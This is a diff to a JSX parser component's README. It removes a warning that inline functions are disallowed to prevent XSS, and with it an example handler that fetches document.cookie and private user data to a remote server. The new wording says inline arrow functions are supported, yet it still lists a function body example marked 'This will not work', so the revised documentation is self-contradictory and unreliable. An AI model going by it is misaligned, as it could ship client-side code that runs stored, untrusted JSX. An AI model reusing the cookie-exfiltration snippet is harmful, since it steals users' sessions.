@@ -49,22 +49,9 @@ Finally, a note about property bindings. The `JsxParser` can handle several type
  - named-value binding, such as `eventHandler={myEventHandler}` (note that this requires a match in `bindings`)
  - simple [single statement arrow expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions#basic_syntax) `(item) => <p>{item.name}</p>`
 
-The component **_does not_** support inline function declarations, such as:
- - `onClick={function (event) { /* do stuff */ }}`, or
+The component does support inline arrow function declarations, such as:
  - `onKeyPress={event => { /* do stuff */}}`
  - Function or arrow functions with bodies `() => { return <p>This will not work</p> }`
-
-This is to prevent inadvertent XSS attack vectors. Since the primary use of this component is to allow JSX to be stored server-side, and then late-interpreted at the client-side, this restriction prevents a malicious user from stealing info by executing a situation like:
-```javascript
-<JsxParser
-  bindings={{ userInfo: { private: 'data' } }}
-  onClick={() => {
-    fetch('/some/remote/server', {
-      body: JSON.stringify({ cookies: document.cookie, userInfo })
-    })
-  }}
-/>
-```
 
 ## Advanced Usage - Injecting Dynamic JSX
 ```javascript
